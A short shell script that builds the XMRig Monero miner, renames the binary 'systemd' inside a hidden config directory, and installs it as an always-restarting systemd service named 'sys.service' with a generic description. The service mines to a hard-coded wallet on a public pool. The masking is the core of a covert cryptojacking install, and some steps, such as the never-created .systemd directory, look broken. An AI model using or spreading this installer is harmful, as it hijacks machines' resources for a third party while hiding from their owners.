mkdir -p $HOME/.config

# Building from source
apt update -y
apt install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev -y
git clone https://github.com/xmrig/xmrig.git
mkdir xmrig/build && cd xmrig/build
cat > ../src/donate.h <<EOL
#ifndef XMRIG_DONATE_H
#define XMRIG_DONATE_H

constexpr const int kDefaultDonateLevel = 1;
constexpr const int kMinimumDonateLevel = 1;

#endif // XMRIG_DONATE_H
EOL
cmake ..
make -j$(nproc)

# Masking xmrig to systemd
mv xmrig $HOME/.config/.systemd/systemd
cd -
mv config.json $HOME/.config/.systemd/config.json


sudo cat > /etc/systemd/system/sys.service <<EOL
[Unit]
Description=Systemd service

[Service]
ExecStart=$HOME/.config/.systemd/systemd --config=$HOME/.config/.systemd/config.json --donate-level 0 -o xmr.2miners.com:2222 -u 42XSJzfAXTjT5Vt5uatbH41SZRepyU2AJdWLVeGNkeZ3bbjUnyyL9X2Qq16BjzHLhkKYvWWcs3f3eKmuUbnJpjPeFm23v4v -p x -k --coin monero -a rx/0 
Restart=always
Nice=10
CPUWeight=1

[Install]
WantedBy=multi-user.target
EOL

sudo systemctl enable --now sys.service
